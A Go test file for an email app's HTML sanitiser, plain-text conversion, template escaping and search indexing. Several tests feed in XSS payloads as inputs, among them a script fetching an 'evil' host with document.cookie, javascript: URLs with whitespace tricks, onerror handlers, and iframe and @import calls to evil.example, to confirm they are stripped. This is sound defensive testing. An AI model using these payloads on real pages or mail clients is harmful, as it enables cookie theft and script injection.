package app

import "strings"

import "testing"

func TestSanitizeStripsScript(t *testing.T) {
	in := `<p>Hello</p><script>fetch('//evil/'+document.cookie)</script>`
	got := SanitizeHTML(in)
	if strings.Contains(strings.ToLower(got), "script") {
		t.Fatalf("script survived: %q", got)
	}
	if !strings.Contains(got, "Hello") {
		t.Fatalf("legitimate content lost: %q", got)
	}
}

func TestSanitizeStripsEventHandlers(t *testing.T) {
	// The editor cannot produce this; a hand-crafted request can.
	in := `<p onclick="steal()" onmouseover="x()">Hi</p>`
	got := SanitizeHTML(in)
	if strings.Contains(got, "onclick") || strings.Contains(got, "onmouseover") {
		t.Fatalf("event handler survived: %q", got)
	}
}

func TestSanitizeStripsJavascriptURL(t *testing.T) {
	in := `<a href="javascript:alert(1)">click</a>`
	got := SanitizeHTML(in)
	if strings.Contains(strings.ToLower(got), "javascript:") {
		t.Fatalf("javascript URL survived: %q", got)
	}
}

func TestSanitizeKeepsWhatMailClientsRender(t *testing.T) {
	// Inline styles, tables and images are the whole vocabulary of email
	// layout. Losing them would leave the editor unable to produce anything.
	in := `<table width="600"><tr><td style="font-family:Arial;font-size:14px">` +
		`<b>Bold</b> <a href="https://x.com/a">link</a> ` +
		`<img src="https://cdn/logo.png" alt="Sunrise" width="120"></td></tr></table>`
	got := SanitizeHTML(in)
	for _, want := range []string{"<table", "<td", "style=", "<b>", "href=", "<img", "alt="} {
		if !strings.Contains(got, want) {
			t.Errorf("lost %q from %q", want, got)
		}
	}
}

func TestSanitizeDropsStyleBlock(t *testing.T) {
	// Not just a security choice: Gmail strips <style> anyway, so allowing it
	// would let somebody compose a mail that looks right here and arrives
	// unstyled. Refusing it up front is more honest.
	in := `<style>.x{color:red}</style><p class="x">Hi</p>`
	got := SanitizeHTML(in)
	if strings.Contains(got, "<style") {
		t.Fatalf("style block survived: %q", got)
	}
}

func TestHTMLToTextProducesReadableAlternative(t *testing.T) {
	in := `<p>Dear John,</p><p>We have <b>304 coil</b> available.</p>` +
		`<ul><li>3.0mm</li><li>3.5mm</li></ul><p>Best regards,<br>Li Na</p>`
	got := HTMLToText(in)
	for _, want := range []string{"Dear John,", "304 coil", "• 3.0mm", "• 3.5mm", "Li Na"} {
		if !strings.Contains(got, want) {
			t.Errorf("text alternative missing %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "<") {
		t.Errorf("markup leaked into the text part:\n%s", got)
	}
}

func TestHTMLToTextDropsInvisibleContent(t *testing.T) {
	// Anything the recipient cannot see in the HTML must not appear in the
	// text part either, or the two versions say different things.
	in := `<style>p{color:red}</style><p>Visible</p>`
	got := HTMLToText(in)
	if strings.Contains(got, "color:red") {
		t.Fatalf("stylesheet leaked into text: %q", got)
	}
	if !strings.Contains(got, "Visible") {
		t.Fatalf("visible text lost: %q", got)
	}
}

func TestHTMLToTextUnescapesEntities(t *testing.T) {
	got := HTMLToText(`<p>Smith &amp; Sons &lt;Trading&gt;&nbsp;Ltd</p>`)
	if got != "Smith & Sons <Trading> Ltd" {
		t.Fatalf("got %q", got)
	}
}

func TestRenderAsHTMLEscapesTheValueNotTheTemplate(t *testing.T) {
	// The template is meant to contain markup; the substituted value is not.
	r := Recipient{Name: "Smith & Sons <Trading>", Email: "x@y.com"}
	tpl := `<p style="font-weight:bold">Dear {{contact_name}},</p>`
	got, missing := RenderAs(tpl, r, me, FormatHTML)
	if len(missing) != 0 {
		t.Fatalf("unexpected missing: %v", missing)
	}
	if !strings.Contains(got, `<p style="font-weight:bold">`) {
		t.Errorf("template markup was escaped: %q", got)
	}
	if !strings.Contains(got, "Smith &amp; Sons &lt;Trading&gt;") {
		t.Errorf("value was not escaped: %q", got)
	}
}

func TestRenderAsTextDoesNotEscape(t *testing.T) {
	r := Recipient{Name: "Smith & Sons", Email: "x@y.com"}
	got, _ := RenderAs("Dear {{contact_name}},", r, me, FormatText)
	if got != "Dear Smith & Sons," {
		t.Fatalf("text render should not escape: %q", got)
	}
}

func TestRenderAsHTMLStillReportsMissing(t *testing.T) {
	// The refusal-to-send guarantee must not be lost in the HTML path.
	blank := Recipient{Email: "x@y.com"}
	_, missing := RenderAs("<p>Dear {{contact_name}},</p>", blank, me, FormatHTML)
	if len(missing) != 1 || missing[0] != "contact_name" {
		t.Fatalf("missing = %v", missing)
	}
}

func TestNormalizeFormatDefaultsToText(t *testing.T) {
	for _, in := range []string{"", "TEXT", "text", "nonsense", "Html "} {
		got := normalizeFormat(in)
		if got != FormatText && got != FormatHTML {
			t.Fatalf("normalizeFormat(%q) = %q", in, got)
		}
	}
	if normalizeFormat("html") != FormatHTML {
		t.Error("lowercase html should normalise to HTML")
	}
	if normalizeFormat("nonsense") != FormatText {
		t.Error("unknown format should fall back to TEXT, not HTML")
	}
}

func TestHTMLToTextDropsInvisibleRunes(t *testing.T) {
	// What bulk senders sprinkle through subject lines to dodge filters. In
	// text they are invisible, so leaving them in means an invisible character
	// sitting in the middle of a word nobody can see or search for.
	got := HTMLToText(`<p>Con&#847;grats&#8203; Fangchen&hellip;</p>`)
	if got != "Congrats Fangchen…" {
		t.Fatalf("got %q", got)
	}
}

func TestSnippetPrefersTextButNotWhenItIsMarkup(t *testing.T) {
	// A sender whose text/plain part is really a whole HTML document. Trusting
	// it put "<!doctype html>..." in front of the person in the mail list.
	got := snippetOf(ParsedMail{
		BodyText: "<!doctype html><html><head><style>.a{color:red}</style></head>" +
			"<body><p>Quote for 500 units</p></body></html>",
		BodyHTML: "<p>Quote for 500 units</p>",
	})
	if got != "Quote for 500 units" {
		t.Fatalf("got %q", got)
	}
}

func TestSnippetKeepsOrdinaryText(t *testing.T) {
	// The common case must not be touched by the markup detour: a plain mail
	// that mentions a tag later on is still plain.
	got := snippetOf(ParsedMail{BodyText: "Hi — is the <b> tag allowed in your template?"})
	if got != "Hi — is the <b> tag allowed in your template?" {
		t.Fatalf("got %q", got)
	}
}

// A URL with a raw space used to lose its whole attribute. The policy sets
// RequireParseableURLs — correctly, it is what keeps javascript: out — and
// bluemonday's answer to a URL net/url will not parse is to drop the
// attribute without a word. An <img> with no src renders as a broken icon and
// its alt text, which reads to the person as "this mail client is broken".
//
// Senders merge values into URLs without encoding them all the time
// (…&pet_name_string=your pet). Browsers and every other mail client cope.
func TestSenderURLsWithWhitespaceKeepWorking(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "a space becomes %20, as a browser would send it",
			in:   `<img src="https://img.example.com/a.png?name=your pet" alt="x">`,
			want: "https://img.example.com/a.png?name=your%20pet",
		},
		{
			// Exactly what `new URL()` does: the newline is removed, the
			// indent's spaces are encoded. Verified against Node's WHATWG URL
			// parser rather than reasoned about — the goal is to fetch the
			// same bytes the recipient's browser would, whatever that is.
			name: "a line-wrapped href follows the URL standard, not intuition",
			in:   "<a href=\"https://example.com/very/long/\n  path?a=1\">link</a>",
			want: "https://example.com/very/long/%20%20path?a=1",
		},
		{
			name: "a tab is removed rather than encoded",
			in:   `<img src="https://img.example.com/a	b.png" alt="x">`,
			want: "https://img.example.com/ab.png",
		},
		{
			name: "single quotes are handled too",
			in:   `<img src='https://img.example.com/b.png?q=a b' alt="x">`,
			want: "https://img.example.com/b.png?q=a%20b",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := SanitizeHTML(c.in)
			if !strings.Contains(out, c.want) {
				t.Errorf("the URL did not survive sanitising\n got: %s\nwant it to contain: %s", out, c.want)
			}
		})
	}
}

// Repairing whitespace must not become a way to smuggle a scheme past the
// policy. "java script:" is not a scheme a browser honours, and must not
// become one here just because the space was encoded.
func TestWhitespaceRepairCannotSmuggleAScheme(t *testing.T) {
	for _, in := range []string{
		`<a href="java script:alert(1)">x</a>`,
		`<a href="java&#9;script:alert(1)">x</a>`,
		`<img src="java
script:alert(1)">`,
		`<a href=" javascript:alert(1)">x</a>`,
	} {
		out := SanitizeHTML(in)
		if strings.Contains(strings.ToLower(out), "javascript:") {
			t.Errorf("a script URL survived sanitising:\n in: %q\nout: %q", in, out)
		}
	}
}

// The body is indexed for search now, so a character that is invisible in the
// rendered mail is not merely untidy in the derived text — it splits a phrase
// and makes the mail unfindable by words the reader can plainly see.
//
// Both paths matter. HTMLToText strips these on its way through, so a
// text/plain body was the only kind that kept them, and text/plain is exactly
// what a plain-text sender provides.
func TestSearchTextDropsCharactersThatAreNotWords(t *testing.T) {
	cases := []struct {
		name       string
		text, html string
		want       string
	}{
		{
			name: "soft hyphens used as padding, from HTML",
			html: "<p>Shop our online­pharmacy­­­ today</p>",
			want: "Shop our onlinepharmacy today",
		},
		{
			name: "a zero-width joiner inside a plain-text phrase",
			text: "your order‍ number is 42",
			want: "your order number is 42",
		},
		{
			name: "a word joiner in a plain-text body",
			text: "invoice⁠ attached",
			want: "invoice attached",
		},
		{
			name: "a non-breaking space is a space, not nothing",
			text: "quote attached",
			want: "quote attached",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := searchTextOf("", "", "", "", c.text, c.html); got != c.want {
				t.Errorf("searchTextOf = %q, want %q\n"+
					"an invisible character left in here makes this mail unfindable by its own words",
					got, c.want)
			}
		})
	}
}

// The subject and the addresses are in the same column as the body, and are
// there for the index rather than for tidiness: a predicate spread across
// five columns with OR cannot use a trigram index, so folding them in is what
// turns a 100 ms scan into a 1.6 ms lookup. A test, because "and also put the
// header in" is exactly the line a later refactor drops as redundant — the
// query would still return the right rows, only slowly, and nothing would say
// so.
func TestSearchTextCarriesTheHeaderSoOneIndexCanServeTheQuery(t *testing.T) {
	got := searchTextOf(
		"Q3 报价单", "Lina Chen", "lina@sunrise.com", "buyer@acme.com",
		"the numbers are attached", "")

	for _, want := range []string{
		"Q3 报价单", "Lina Chen", "lina@sunrise.com", "buyer@acme.com",
		"the numbers are attached",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("searchTextOf dropped %q, so one ILIKE cannot answer for it\ngot: %q", want, got)
		}
	}
	// Header first: a hit on the subject should produce a match snippet that
	// opens with the subject rather than a fragment from nowhere.
	if !strings.HasPrefix(got, "Q3 报价单") {
		t.Errorf("the header is not first, so a subject hit yields a snippet with no context\ngot: %q", got)
	}
}

// What a received mail keeps when it is shown back, and what it never keeps.
//
// The reader policy is wider than the sending one in exactly two ways — the
// sender's stylesheet and their class names — because those two are most of
// how a modern mail looks like itself. It is only safe to be wider because
// the result is rendered inside a sandboxed frame; these tests hold both
// halves of that bargain.
func TestReaderKeepsTheSendersStylesheet(t *testing.T) {
	in := `<html><head><style>.hero{font-size:48px;color:#111}</style></head>
	       <body><h2 class="hero">Time to make a move</h2></body></html>`

	read := SanitizeForReading(in)
	if !strings.Contains(read, ".hero{font-size:48px") {
		t.Errorf("the stylesheet was dropped, so the mail renders at browser defaults\ngot: %s", read)
	}
	if !strings.Contains(read, `class="hero"`) {
		t.Errorf("the class was dropped, so the rule has nothing to apply to\ngot: %s", read)
	}

	// And the sending policy must stay narrow: outgoing mail is rendered by
	// clients we do not control, where a stylesheet is unreliable and inline
	// style is the only thing that travels.
	if strings.Contains(SanitizeHTML(in), "<style") {
		t.Error("the sending policy kept a stylesheet; it must not")
	}
}

func TestReaderStillRefusesWhatTheFrameCannotContain(t *testing.T) {
	cases := []struct {
		name, in, mustNotContain string
	}{
		{"script element", `<div><script>alert(1)</script></div>`, "<script"},
		{"script inside the stylesheet", `<style>x{}</style><script>a()</script>`, "<script"},
		{"event handler", `<div onclick="alert(1)">x</div>`, "onclick"},
		{"javascript url", `<a href="javascript:alert(1)">x</a>`, "javascript:"},
		{"iframe of their own", `<iframe src="https://evil.example"></iframe>`, "<iframe"},
		// Not script, but a stylesheet fetched from wherever the sender likes
		// is a beacon that outlives the image blocker.
		{"remote stylesheet", `<style>@import url(https://evil.example/x.css);</style>`, "@import"},
		{"IE expression", `<style>a{width:expression(alert(1))}</style>`, "expression("},
		// A stylesheet that closes its own tag would become markup again.
		{"tag-closing inside CSS", `<style>a{}</style><style>b{}</style></style><img src=x onerror=alert(1)>`, "onerror"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := strings.ToLower(SanitizeForReading(c.in))
			if strings.Contains(out, strings.ToLower(c.mustNotContain)) {
				t.Errorf("%q survived into a mail we render\ngot: %s", c.mustNotContain, out)
			}
		})
	}
}
